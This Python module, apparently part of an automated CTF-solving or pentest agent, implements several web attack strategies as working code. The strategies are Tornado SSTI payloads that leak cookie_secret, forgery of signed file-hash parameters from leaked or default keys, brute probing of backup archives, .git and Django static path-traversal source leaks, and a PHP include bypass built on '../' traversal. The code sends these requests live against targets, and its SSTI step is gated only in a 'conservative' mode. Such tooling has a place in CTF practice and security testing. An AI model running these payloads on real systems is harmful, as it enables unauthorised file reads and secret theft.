"""Hash-guarded read & backup-source-leak strategy executor.

P5 / seventeenth cut: the hash-guarded-read + backup-source-leak cluster
(6 methods, ~554 lines) is physically moved out of CTFTaskDispatcher into a
behaviour-preserving mixin — the Tornado cookie_secret leak + hash-guarded
file read, the generalized signed-hash reconstruction pipeline, the
backup/source-leak probe strategy, and the warmup-include bypass helpers.

Two top-level constants travel with the cluster (both confirmed
only-this-cluster by the middle-band survey): ``_COMMON_BACKUP_PATHS`` and
``_DJANGO_STATIC_SOURCE_PROBES`` move into this module and are deleted from
the top of ctf_dispatcher.py — no sinking to dispatcher_helpers. Every other
module-level symbol is already exported from acyclic ``dispatcher_helpers``
(``_base_target``, ``_BACKUP_CLUE_RE``, ``_infer_hash_format``,
``_discover_hash_params``, ``_compute_signed_hash``,
``_looks_like_inline_source_leak``, ``_looks_like_python_source_leak``,
``_looks_like_backup_source_candidate``, ``_looks_like_archive_path``,
``_strip_html_text``, ``_normalize_exploration_url``) plus ``_ChainOutcome``
from ``chains.base`` and stdlib ``re`` / ``urllib.parse``.

All ``self.*`` access resolves via the MRO of the dispatcher that mixes this
in: render-surface helpers (RenderSurfaceMixin), ``_ssti_exploitation_gated_by_mode``
/ ``_run_ssti_probe_strategy`` (SSTIExecutorMixin), ``_extract_flag``
(FlagParserMixin), ``_observe_flag`` (FlagObserverMixin), ``_store_note``
(NoteStoreMixin), and the dispatcher-resident ``_scan_and_store`` / ``_emit``
/ ``_recent_source_hint_backup_probe_paths`` /
``_download_and_analyze_backup_artifact``. Call sites unchanged. Pure code
relocation, near-zero risk.
"""

from __future__ import annotations

import re
from typing import Any
from urllib.parse import quote, urljoin, urlparse

from .chains.base import _ChainOutcome
from .dispatcher_helpers import (
    _BACKUP_CLUE_RE,
    _base_target,
    _compute_signed_hash,
    _discover_hash_params,
    _infer_hash_format,
    _looks_like_archive_path,
    _looks_like_backup_source_candidate,
    _looks_like_inline_source_leak,
    _looks_like_python_source_leak,
    _normalize_exploration_url,
    _strip_html_text,
)

_COMMON_BACKUP_PATHS = (
    "/www.zip",
    "/backup.zip",
    "/source.zip",
    "/web.zip",
    "/site.zip",
    "/www.tar.gz",
    "/backup.tar.gz",
    "/index.php.bak",
    "/index.php~",
    "/index.phps",
    "/.git/HEAD",
)
_DJANGO_STATIC_SOURCE_PROBES = (
    "/static../views.py",
    "/static../settings.py",
    "/static../urls.py",
    "/static../models.py",
    "/static../app/views.py",
    "/static../main/views.py",
    "/static../urlstorage/views.py",
    "/static/../views.py",
    "/static/../settings.py",
    "/static/../urls.py",
    "/static/../models.py",
)


class HashBackupExecutorMixin:
    """Hash-guarded file read, signed-hash reconstruction and backup-source leak."""

    async def _run_hash_guarded_file_read_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """
        Input:  target URL + page_features（需有 filename+filehash URL）
        Output: _ChainOutcome；副作用：写入 observations（含 cookie_secret）
        Success: SSTI 泄露 cookie_secret 后计算 hash 拿到 flag
        Failure: SSTI 无效；上层继续

        Secret extraction strategy (3 tiers):
        Tier-1: UUID hex (8-4-4-4-12)
        Tier-2: 32-char pure hex (MD5 format)
        Tier-3: any 4-64 char word token not present in baseline response
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)

        # Conservative (pentest) mode: this strategy leaks cookie_secret via
        # /error?msg={{handler.settings}} SSTI — gate it on a confirmed {{7*7}}
        # probe (info-gathering first). Run the probe inline if needed; if it
        # still doesn't confirm, withhold the cookie_secret leak. Aggressive
        # (CTF) mode exploits directly — the shortest chain to the flag.
        if self.exploitation_mode == "conservative":
            if self._ssti_exploitation_gated_by_mode():
                await self._run_ssti_probe_strategy(target, page_features)
            if self._ssti_exploitation_gated_by_mode():
                return _ChainOutcome(
                    progress=False,
                    reason="conservative mode: SSTI not confirmed by probe; cookie_secret leak withheld",
                )
        progress = False
        reasons: list[str] = []

        # Step 0: 基线请求，提取常见 token 用于后续 diff
        baseline_tokens: set[str] = set()
        try:
            baseline_resp = await self.runtime.proxy_action(
                "get",
                url=urljoin(base + "/", "file") + "?filename=probe_test&filehash=test",
                timeout=10,
            )
            if isinstance(baseline_resp, dict) and not baseline_resp.get("error"):
                baseline_body = str(baseline_resp.get("body") or "")
                baseline_plain = re.sub(r"<[^>]+>", " ", baseline_body)
                baseline_tokens = set(re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{3,}", baseline_plain))
        except Exception:
            pass

        # Tornado SSTI 注入点：filename 参数或题面暴露的 render/error 参数。
        # easy_tornado 类题常拦截通用 {{7*7}} 和 filename SSTI，但允许
        # /error?msg={{handler.settings}} 泄露 cookie_secret。
        ssti_payloads = [
            "{{handler.settings}}",
            '{{handler.settings["cookie_secret"]}}',
            '{{handler.settings.get("cookie_secret","")}}',
        ]
        _COMMON_SKIP = {
            "html", "body", "head", "title", "div", "span", "script", "style",
            "error", "file", "hash", "test", "probe", "true", "false", "null",
            "http", "https", "filehash", "filename", "handler", "settings",
            "cookie", "secret", "cookie_secret", "Error", "filehash",
            "probe_test",
        }
        cookie_secret: str | None = None

        render_surfaces = self._collect_render_surface_urls(base, page_features)
        surface_signature = self._strategy_surface_signature(
            "hash_guarded_file_read",
            [urljoin(base + "/", "file?filename=<ssti>&filehash=test"), *render_surfaces],
        )
        if self._was_strategy_surface_exhausted("hash_guarded_file_read", surface_signature):
            return _ChainOutcome(
                progress=False,
                reason="hash_guarded_file_read render surface already exhausted",
            )

        for payload in ssti_payloads:
            encoded = quote(payload, safe="")
            probe_urls = [urljoin(base + "/", "file") + f"?filename={encoded}&filehash=test"]
            for render_url in render_surfaces:
                injected = self._inject_render_payload(render_url, payload)
                if injected not in probe_urls:
                    probe_urls.append(injected)

            found_body = ""
            found_url = ""
            for probe_url in probe_urls:
                try:
                    resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
                except Exception:
                    continue
                if not isinstance(resp, dict) or resp.get("error"):
                    continue
                body = str(resp.get("body") or "")
                if not body:
                    continue
                final_url = str(resp.get("final_url") or probe_url)
                redirect_history = list(resp.get("redirect_history") or [])
                if redirect_history and final_url and final_url != probe_url and payload not in final_url:
                    replay_url = self._inject_render_payload(final_url, payload)
                    try:
                        replay_resp = await self.runtime.proxy_action("get", url=replay_url, timeout=10)
                    except Exception:
                        replay_resp = {}
                    if isinstance(replay_resp, dict) and not replay_resp.get("error"):
                        replay_body = str(replay_resp.get("body") or "")
                        if replay_body:
                            body = replay_body
                            probe_url = replay_url
                found_body = body
                found_url = probe_url
                break
            if not found_body:
                continue
            progress = True
            reasons.append(f"SSTI probe len={len(found_body)}")
            if self.state is not None:
                self.state.add_observation(
                    "ssti_probe_response",
                    found_body[:300],
                    source="hash_guarded_file_read",
                    metadata={"payload": payload, "url": found_url},
                )
            # 直接看 flag
            flag = self._extract_flag(found_body)
            if flag:
                verification = await self._observe_flag(
                    flag, base, evidence_source="response_body", rationale="hash_guarded SSTI"
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(progress=True, flag=verification.flag, reason="SSTI flag")
            await self._scan_and_store(found_body, base, evidence_source="response_body")

            # 三层提取策略
            plain = re.sub(r"<[^>]+>", " ", found_body)  # 去 HTML 标签

            # 层1：UUID 格式（含 dash）
            uuid_m = re.search(
                r"\b([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b",
                plain, re.IGNORECASE,
            )
            if uuid_m:
                cookie_secret = uuid_m.group(1)
                break

            # 层2：32 位纯 hex（MD5 格式），排除基线
            hex32_m = re.search(r"\b([0-9a-f]{32})\b", plain, re.IGNORECASE)
            if hex32_m and hex32_m.group(1) not in baseline_tokens:
                cookie_secret = hex32_m.group(1)
                break

            # 层3：宽松 word 匹配 — 任意 4-64 字符的新 token（不在基线、不是常见词）
            for token in re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{4,64}", plain):
                if token in baseline_tokens:
                    continue
                if token.lower() in _COMMON_SKIP:
                    continue
                cookie_secret = token
                break
            if cookie_secret:
                break

        if cookie_secret and self.state is not None:
            self.state.add_observation(
                "cookie_secret_leaked",
                cookie_secret,
                source="hash_guarded_file_read",
                metadata={"method": "ssti_injection"},
            )
            outcome = await self._run_hash_reconstruction_attack_strategy(base, cookie_secret)
            if outcome.flag:
                return outcome
            reasons.append(f"cookie_secret obtained ({cookie_secret[:6]}...), hash computed")

        if not cookie_secret and progress:
            self._mark_strategy_surface_exhausted(
                "hash_guarded_file_read",
                surface_signature,
                reason="cookie_secret probes returned no secret",
                surface_count=len(render_surfaces),
            )

        return _ChainOutcome(progress=progress, reason="; ".join(reasons[:3]))

    async def _run_hash_reconstruction_attack_strategy(
        self,
        target: str,
        cookie_secret: str | None = None,
    ) -> _ChainOutcome:
        """Phase 7 §7 (SignSaboteur): 四步泛化签名利用管道。

        1. token-discovery: 从 state 观测中收集 filename+filehash 候选参数
        2. format-inference: 根据 filehash 长度推断 md5 / sha256
        3. key-guess: 优先用传入的 cookie_secret；若无则从 state 中找 cookie_secret_leaked obs
        4. access-check: 重构签名后请求目标资源

        Input:  target URL + 可选 cookie_secret（直接传入时跳过 key-guess 步骤）
        Phase 7 初版支持 md5 和 sha256；JWT 延至 Phase 8。
        """
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        target_files = self._collect_candidate_filenames()

        # ── key-guess: 收集候选密钥 ──────────────────────────────────────
        key_candidates: list[str] = []
        if cookie_secret:
            key_candidates.append(cookie_secret)
        if self.state is not None:
            for obs in self.state.observations:
                if obs.kind == "cookie_secret_leaked":
                    val = str(obs.value or "").strip()
                    if val and val not in key_candidates:
                        key_candidates.append(val)
        # 空密钥和常见默认密钥（通用兜底）
        _COMMON_DEFAULTS = ("", "secret", "mysecret", "tornado_secret")
        for default_key in _COMMON_DEFAULTS:
            if default_key not in key_candidates:
                key_candidates.append(default_key)

        # ── format-inference: 从 state 中找已知的 filehash 值推断格式 ──
        inferred_fmt: str | None = None
        if self.state is not None:
            for obs in self.state.observations:
                if obs.kind == "hash_reconstruction_response":
                    fh = str((obs.metadata or {}).get("hash") or "")
                    fmt = _infer_hash_format(fh)
                    if fmt != "unknown":
                        inferred_fmt = fmt
                        break
        # 尝试从 URL 参数中推断（通过候选文件名 URL 模式）
        if inferred_fmt is None and self.state is not None:
            for obs in self.state.observations:
                disc = _discover_hash_params(str(obs.value or ""))
                if disc.get("filehash"):
                    fmt = _infer_hash_format(disc["filehash"])
                    if fmt != "unknown":
                        inferred_fmt = fmt
                        break

        # 格式优先序：已推断的 > md5（Tornado 默认）> sha256
        fmt_order: list[str] = []
        if inferred_fmt:
            fmt_order.append(inferred_fmt)
        for fallback in ("md5", "sha256"):
            if fallback not in fmt_order:
                fmt_order.append(fallback)

        # ── access-check ─────────────────────────────────────────────────
        for secret_key in key_candidates:
            for fmt in fmt_order:
                for filename in target_files:
                    computed_hash = _compute_signed_hash(secret_key, filename, fmt)
                    if computed_hash is None:
                        continue
                    url = urljoin(base + "/", "file") + f"?filename={filename}&filehash={computed_hash}"
                    try:
                        resp = await self.runtime.proxy_action("get", url=url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    status = int(resp.get("status_code") or 0)
                    if self.state is not None:
                        self.state.add_observation(
                            "hash_reconstruction_response",
                            body[:300],
                            source="hash_reconstruction_attack",
                            metadata={
                                "filename": filename,
                                "hash": computed_hash,
                                "hash_format": fmt,
                                "url": url,
                                "status": status,
                            },
                        )
                    if body:
                        await self._scan_and_store(body, base, evidence_source="response_body")
                    flag = self._extract_flag(body)
                    if flag:
                        verification = await self._observe_flag(
                            flag, base,
                            evidence_source="response_body",
                            rationale=f"hash_reconstruction({fmt}): {filename}",
                        )
                        if verification.decision in {"verified", "runtime"}:
                            return _ChainOutcome(
                                progress=True,
                                flag=verification.flag,
                                reason=f"hash_reconstruction({fmt}) flag: {filename}",
                            )

        return _ChainOutcome(progress=False, reason="hash_reconstruction: no flag in target files")

    # ------------------------------------------------------------------

    async def _run_backup_source_leak_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        base = _base_target(target)
        observed_text = "\n".join(
            str(part)
            for part in (
                page_features.get("content") or "",
                page_features.get("html") or "",
                hint or "",
            )
            if part
        )
        reasons: list[str] = []
        progress = False

        if _BACKUP_CLUE_RE.search(observed_text):
            reasons.append("backup/source clue observed")

        candidate_urls: list[tuple[str, str]] = []
        current_source_blob = "\n".join(
            str(part)
            for part in (
                page_features.get("html") or "",
                page_features.get("content") or "",
            )
            if part
        )
        current_candidate_url = str(page_features.get("url") or target or "").strip() or target
        if current_source_blob and _looks_like_inline_source_leak(current_source_blob):
            reasons.append("inline source leak observed on current page")
            candidate_urls.append((urlparse(current_candidate_url).path or current_candidate_url, current_candidate_url))
        for rel_path in self._recent_source_hint_backup_probe_paths():
            artifact_url = urljoin(base + "/", rel_path.lstrip("/"))
            candidate_urls.append((rel_path, artifact_url))
        for rel_path in (*_COMMON_BACKUP_PATHS, *_DJANGO_STATIC_SOURCE_PROBES):
            artifact_url = urljoin(base + "/", rel_path.lstrip("/"))
            candidate_urls.append((rel_path, artifact_url))
        for raw in list(page_features.get("raw_links") or []):
            absolute = _normalize_exploration_url(str(raw or "").strip())
            if not absolute:
                continue
            lowered = absolute.lower()
            if any(
                token in lowered
                for token in (
                    ".zip",
                    ".tar.gz",
                    ".tgz",
                    ".tar",
                    ".gz",
                    ".bak",
                    ".phps",
                    ".db",
                    ".sqlite",
                    ".wal",
                )
            ):
                candidate_urls.append((urlparse(absolute).path or absolute, absolute))
            elif any(
                lowered.endswith(suffix)
                for suffix in ("/source.php", "/hint.php", "/index.php", "/flag.php", ".phps")
            ):
                candidate_urls.append((urlparse(absolute).path or absolute, absolute))

        seen_candidates: set[str] = set()
        for rel_path, artifact_url in candidate_urls:
            if artifact_url in seen_candidates:
                continue
            seen_candidates.add(artifact_url)
            resp = await self.runtime.proxy_action(
                "get",
                url=artifact_url,
                timeout=12,
            )
            if not isinstance(resp, dict) or resp.get("error"):
                continue

            status_code = int(resp.get("status_code") or 0)
            body = str(resp.get("body") or "")
            if status_code != 200 or not body:
                continue
            if rel_path in _DJANGO_STATIC_SOURCE_PROBES and not _looks_like_python_source_leak(
                rel_path,
                body,
            ):
                continue
            if not _looks_like_backup_source_candidate(rel_path, body, resp.get("headers")):
                continue

            progress = True
            await self._scan_and_store(body, base, evidence_source="source-leak")
            await self._store_note(
                key="ctf_backup_candidate",
                value=f"found backup/source candidate at {artifact_url}",
                category="artifact",
                target=urlparse(base).netloc or base,
                url=artifact_url,
                strategy_kind="backup_source_leak",
            )
            self._emit(f"[CTF dispatcher] backup candidate: {artifact_url}")

            extracted_flag = self._extract_flag(body)
            if extracted_flag:
                verification = await self._observe_flag(
                    extracted_flag,
                    base,
                    evidence_source="source-leak",
                    rationale=f"backup leak: {rel_path}",
                )
                if verification.decision == "verified":
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"backup leak: {rel_path}",
                    )

            if _looks_like_archive_path(rel_path, body) or _looks_like_inline_source_leak(body):
                analysis = await self._download_and_analyze_backup_artifact(
                    artifact_url,
                    base,
                )
                progress = progress or analysis.progress
                if analysis.flag:
                    return analysis
                if analysis.reason:
                    reasons.append(analysis.reason)

            if self._looks_like_warmup_include_source(body):
                warmup = await self._attempt_warmup_include_bypass(
                    base,
                    source_url=artifact_url,
                    source_body=body,
                    page_features=page_features,
                )
                progress = progress or warmup.progress
                if warmup.flag:
                    return warmup
                if warmup.reason:
                    reasons.append(warmup.reason)

        return _ChainOutcome(progress=progress, reason="; ".join(filter(None, reasons)))

    def _looks_like_warmup_include_source(self, body: str) -> bool:
        lowered = str(body or "").lower()
        return (
            "checkfile" in lowered
            and "include" in lowered
            and "$_request" in lowered
            and "source.php" in lowered
            and "hint.php" in lowered
        )

    async def _attempt_warmup_include_bypass(
        self,
        base: str,
        *,
        source_url: str,
        source_body: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        source_text = _strip_html_text(str(source_body or ""))
        candidate_files = self._extract_warmup_flag_filenames(source_text)

        hint_url = urljoin(base + "/", "hint.php")
        try:
            hint_resp = await self.runtime.proxy_action("get", url=hint_url, timeout=10)
        except Exception:
            hint_resp = {}
        hint_body = str((hint_resp or {}).get("body") or "") if isinstance(hint_resp, dict) else ""
        if hint_body:
            await self._scan_and_store(
                hint_body,
                hint_url,
                evidence_source="source-leak",
                page_features=page_features,
            )
            candidate_files.extend(self._extract_warmup_flag_filenames(hint_body))

        seen_files: set[str] = set()
        normalized_files: list[str] = []
        for candidate in candidate_files:
            normalized = str(candidate or "").strip().lstrip("/")
            if not normalized or normalized in seen_files:
                continue
            seen_files.add(normalized)
            normalized_files.append(normalized)

        if not normalized_files:
            return _ChainOutcome(progress=True, reason="warmup include source found but no flag filename hint")

        prefixes = ("source.php", "hint.php")
        traversal_prefixes = [
            "../" * depth
            for depth in range(4, 8)
        ]
        for filename in normalized_files[:4]:
            for prefix in prefixes:
                for traversal in traversal_prefixes:
                    payload = f"{prefix}?{traversal}{filename}"
                    url = urljoin(base + "/", "?file=" + quote(payload, safe="/"))
                    try:
                        resp = await self.runtime.proxy_action("get", url=url, timeout=10)
                    except Exception:
                        continue
                    if not isinstance(resp, dict) or resp.get("error"):
                        continue
                    body = str(resp.get("body") or "")
                    if not body:
                        continue
                    await self._scan_and_store(
                        body,
                        url,
                        evidence_source="response_body",
                        page_features=page_features,
                    )
                    flag = self._extract_flag(body)
                    if not flag:
                        continue
                    verification = await self._observe_flag(
                        flag,
                        base,
                        evidence_source="response_body",
                        rationale=f"warmup include bypass from {source_url}",
                        evidence_url=url,
                        evidence_snippet=body[:240],
                        replayable=True,
                        strategy_kind="backup_source_leak",
                    )
                    if verification.decision in {"verified", "runtime"}:
                        return _ChainOutcome(
                            progress=True,
                            flag=verification.flag,
                            reason=f"warmup include bypass: {filename}",
                        )

        return _ChainOutcome(progress=True, reason="warmup include bypass exhausted")

    def _extract_warmup_flag_filenames(self, text: str) -> list[str]:
        blob = str(text or "")
        candidates: list[str] = []
        patterns = (
            r"flag\s+(?:not\s+here,\s+and\s+)?flag\s+in\s+([A-Za-z0-9_./-]{4,})",
            r"flag\s+(?:is\s+)?(?:in|at)\s+([A-Za-z0-9_./-]{4,})",
            r"\b([A-Za-z0-9_]*f{2,}l{2,}a{2,}g{2,}[A-Za-z0-9_./-]*)\b",
        )
        for pattern in patterns:
            for match in re.findall(pattern, blob, flags=re.IGNORECASE):
                normalized = str(match or "").strip().strip(".,;:'\"()[]{}")
                if normalized and normalized not in candidates:
                    candidates.append(normalized)
        return candidates
